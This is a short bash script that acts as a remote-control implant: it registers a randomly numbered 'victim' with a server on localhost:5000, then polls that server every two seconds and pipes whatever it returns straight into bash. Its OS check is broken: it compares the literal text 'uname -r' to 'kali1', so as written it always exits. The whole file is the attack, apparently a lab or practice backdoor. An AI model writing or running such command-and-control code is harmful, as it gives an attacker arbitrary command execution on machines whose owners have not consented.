#!/bin/bash


os_type='uname -r'

substring=$(echo $os_type | cut -d '-' -f 2)

if [ "$os_type" != "kali1" ]
then
	exit
fi

let victimID=$RANDOM

curl -s localhost:5000/registervictim/$victimID

while true; do
 curl -s localhost:5000/command/$victimID | bash -e
 sleep 2
done

